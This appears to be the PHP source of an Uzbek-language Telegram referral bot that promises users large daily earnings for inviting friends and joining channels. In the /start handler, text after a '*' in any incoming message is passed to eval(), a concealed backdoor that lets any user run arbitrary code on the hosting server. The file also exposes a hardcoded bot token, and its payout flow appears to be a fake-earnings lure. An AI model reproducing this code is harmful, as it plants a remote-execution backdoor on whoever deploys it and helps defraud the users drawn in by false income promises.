<?php
//    ___________________________________///
//      ÷÷÷÷÷÷÷ FAST CODER ÷÷÷÷÷÷÷÷  ///
//      ÷÷÷÷÷÷÷÷ PHP TEAM ÷÷÷÷÷÷÷÷  ///
//      ÷÷÷÷÷÷÷ @Fast_Coder ÷÷÷÷÷÷÷  ///
//     ÷÷÷ @Rustam_Hikmatullayev ÷÷÷ ///
//    __________________________________///
ob_start();
define('API_KEY','1431802674:AAHzIZhyqgIJFtuJTEKVZyZZiHfWXIUys2U');
$admin = "1171894731";//admin id raqami
$kanalimz ="@Hacker_Bey";//Kanalingiz @ bilan
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }
//@UzMaxBoy dan sovg'a//

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
mkdir("azo");
mkdir("coin");
mkdir("kurator");
mkdir("puli");
//@UzMaxBoy dan sovg'a//

  
$update = json_decode(file_get_contents('php://input'));
$name = $message->from->first_name;
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
//callback
$data = $update->callback_query->data;
$qid = $update->callback_query->id;
$callcid = $update->callback_query->message->chat->id;
$clid = $update->callback_query->from->id;
$callmid = $update->callback_query->message->message_id;
$gid = $update->callback_query->message->chat->id;
$refsum = 500;//referal uchun bonus
$minimalka = 10000;//minimal yechish
$tx = $message->text;
$name = $message->chat->first_name;
$user = $message->from->username;
$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"👥 Referal"],['text'=>"💰 Balans"]],
[['text'=>"Odam qo'shish"],['text'=>"📤 Pulni yechish"]],
[['text'=>"📢 Reklama qilish"],['text'=>"📊 Statistika"]]
]
]);

if(strpos($tx,"/start")!==false){
$refk = file_get_contents("kurator/$cid.dat");
$teksha = (strlen($refk) == 9);
   if(mb_stripos($refk,$teksha) !==false){
   }else{ 
$c = explode(" ",$tx);
$content = $c[1];
   $file=fopen("kurator/$cid.dat","a");
   fwrite($file,$content);
   fclose($file);
   
   } 
}
if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

//@UzMaxBoy dan sovg'a//




$balinfo = "🚀 Salom $name, @PAYNET_SMBOT ga hush kelibsiz

💰Bizning bot orqalik telegramdan chiqmasdan kuniga 50 ming so'mdan 100 ming so'mgacha toping

💸 Topshiriqni bajaring va pul ishlang:
👤 Har bir chaqirgan do'stingiz uchun  500 so'm ga ega bo'ling


🐥 Barcha botimizdan pul yechish yo'llari PAYNET orqalik amalga oshiriladi";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {
bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"$balinfo",
    'reply_markup'=>$key
    ]);
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.dat");
    file_put_contents("coin.dat","$bazan$cid");
  }
if(strpos($tx,"/start $cid")!==false){
  
  //@UzMaxBoy dan sovg'a//
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"G'irromlik mumkin emas",
      ]);
    } 
  }
}
$abb=file_get_contents("coin/$cid.dat");
if($abb){}else{
  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}
}

//@UzMaxBoy dan sovg'a//
if($tx == "💰 Balans"){
      $ball = file_get_contents("puli/$cid.dat");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🆔 Sizning id raqamingiz: `$cid`

🔸 Siz chaqirgan azolar soni $odam
🔹 Sizning pulingiz : $ball so'm",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2, 
      ]);
    }
}
if($tx=="📤 Pulni yechish"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"⌛ Yahshi sizning jami yig'gan pulingiz: $ball so'm

🔰Telefon raqamingizni kiriting Tolov faqat PAYNET orqalik amalga oshiriladi
Iltimos telefon raqamingizni shu tarzda kiriting👇
Namuna: /pay +998xxxxxxxxx 50000

⚠ Eng oz chiqaraladigan summa: 50000 so'm",
'parse_mode'=>'markdown',
'disable_web_page_preview'=>'true'
        ]);
    
    
}
if($tx=="Odam qo'shish"){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"ℹ Botning official guruxi 👇 
Guruximizga kirasiz guruximizga 1000 ta odam qo'shsangiz bot hisobingizga 5000 so'm qo'shiladi mamnuniyat ila @Shox_Xacker",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"Guruximiz","url"=>"t.me/Hacker_Bey_group"]],
]
])
]);
}
//@UzMaxBoy dan sovg'a//
if($tx=="📢 Reklama qilish"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Siz kanal yoki gurupa yoki botingizni reklama qildirmoqchimisiz unda @Shox_Xacker ga muro'jat qiling!"
        
        ]);
    
}
if(strpos($tx,"/pay")!==false){
    $ex=explode(" ",$tx);
    $ab=file_get_contents("puli/$cid.dat");
    
    if( $ex[2]>=10000 and $ab>=$ex[2] ){
$bb=$ab-$ex[2];
$t=file_get_contents("tolov.txt");
$t=$t+1;
file_put_contents("tolov.txt","$t");
$t=file_get_contents("tolov.txt");
  file_put_contents("puli/$cid.dat","$bb");
  $tolov=file_get_contents("tolovlar.txt");
  $tolov=$tolov+$ex[2];
  file_put_contents("tolovlar.txt","$tolov");

$bb=substr($ex[1],0,7);
$gg="XX";
$ss=substr($ex[1],8,8);
  file_put_contents("$cid.t","🆔 To'lov IDsi: $t,
☎️ Raqam: $bb$gg$ss,
💰 Summa: $ex[2] So'm
✅ Bajarildi.");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🕒 Buyurtma Qabul Qilindi!
☎️ Raqam: $ex[1]
💰 Summa: $ex[2]

✔ Sizning arizangiz adminga jo'natildi iltimos kuting 168 soat orasida sizning telefon raqamingizga pul o'tqaziladi iltimos 168 soat kuting biz albatta to'lov qilamiz!"
        ]);
        
        bot('sendmessage',[
            'chat_id'=>"1171894731",
            'text'=>"🛑 Yangi Buyurtma!
🧷 Username: @$user,
🔗 Profili: <a href='tg://user?id=$cid'> $name </a>,
💰 Summa: $ex[2] So'm,
☎️ Raqam: $ex[1],
✅ /done_$cid",
            'disable_web_page_preview'=>true,
            'parse_mode'=>'html',
            ]);
          
}else{bot('sendmessage',['chat_id'=>$cid,'text'=>"Sizning balansizngizda yetarli mablag' mavjud emas yegishni davom eting!! yoki minimal miqdordan oz kiritmoqdasiz"]);} }
if($tx=="/admin"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Bunday menyu yo'q"
        
        ]);
    
}

    if($tx == "👥 Referal"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"💲 Siz har taklif qilgan do'stingiz uchun
✅ 500 so'm olasiz

Sizning referal manzilingiz
https://t.me/PAYNET_SMBOT?start=$cid

❗️Do'stingini chaqiring va pul ishlang👍💰
Siz chaqirgan azolar kanalimizga azo bo'lishi shart azo bo'lmasa sizga pul berilmaydi!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      'disable_web_page_preview'=>'true'
      ]);
    }

    $reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$reply_menu,
      ]);
    }

    if($replyik=="Yuboriladigon xabarni kiriting. Xabar turi markdown"){
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("n",$idss);
      foreach($idszs as $idlat){
      $hamma=bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
    }
    //@UzMaxBoy dan sovg'a//
if($hamma){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Hammaga habar yetkazildi",

]);

}
    }else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Botdan pul ishlashni boshlash uchun kanalimizga qo'shilishingiz kerak.
      
Kanalga qo'shiling va
✅ ТАСДИКЛАШ tugmasini bosing 
      
kanalimizga qo'shilmaguningizgacha pul ishlay olmaysiz
      
Har bir do'stingiz uchun 500 so'mni qo'lga kiring",
      'reply_markup'=>json_encode([
   'inline_keyboard'=>[
       [['text'=>"1-Kanalimiz","url"=>"t.me/Hacker_Bey"]],
       [['text'=>"2-Kanalimiz","url"=>"t.me/BEPUL_VIP"]],
   [['text'=>'✅ ТАСДИКЛАШ','callback_data'=>"UZ"]],
       ]
    ])
    ]);
  }
}if(strpos($tx,"/done_")!==false){
    $ex=explode("_",$tx);
    $kanalimiz="@Hacker_Bey";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"✅ To'lov Haqida Kanalda Ma'lumot Chiqarildi
📡 Kanalga Qarang: @Hacker_Bey"
        ]);
}
if($data=="UZ"){
    $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $clid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    bot('deletemessage',[
        'chat_id'=>$callcid,
        'message_id'=>$callmid,
        ]);
        bot('sendmessage',[
        'chat_id'=>$callcid,
        'text'=>"✅ Kanalimizga Ulandingiz. endi pul ishlashingiz mumkin.",
        'reply_markup'=>$key,
        ]);

$refk = file_get_contents("kurator/$callcid.dat");
$teksha = (strlen($refk) == 9);
  if(mb_stripos($teksha) !==false){
   bot('sendMessage',[
      'chat_id'=>$callcid,
      'text'=>"Siz bizning botimizga qaytganingizdan mamnunmiz!",
      'parse_mode'=>'markdown',
      'reply_markup'=>$key,
      ]);
   }else{ 
 bot('sendMessage',[
      'chat_id'=>$callcid,
      'text'=>"Endi bemalol pul ishlashingiz mumkin!",
      'parse_mode'=>'markdown',
      'reply_markup'=>$key
      ]);
      $usr = file_get_contents("puli/$refk.dat");
      $usr = $usr + $refsum;
      file_put_contents("puli/$refk.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refk,
      'text'=>"Siz [ushbu foydalanuvchi](tg://user?id=$callcid) Taklif Qilganingiz Uchun $refsum So'm Bonus Taqdim Etildi!",
      'parse_mode'=>'markdown',
     'reply_markup'=>$key
      ]);
   } 
}
}




if(mb_stripos($tx,"/start")!==false){

   $baza=file_get_contents("azo.dat");
   if(mb_stripos($baza,$chat_id) !==false){
   }else{
   $txt="n$cid";
   $file=fopen("azo.dat","a");
   fwrite($file,$txt);
   fclose($file);
   }
}
if(mb_stripos($tx,"stat")!==false){
      $baza=file_get_contents("azo.dat");
      $all=substr_count($baza,"n");
      $txt = "📶 Barcha foydalanuvchilar: $all";
  bot('sendmessage',[
   'chat_id'=>$cid,
   'parse_mode'=>'html',
   'text'=>$txt,
  ]);
}


?>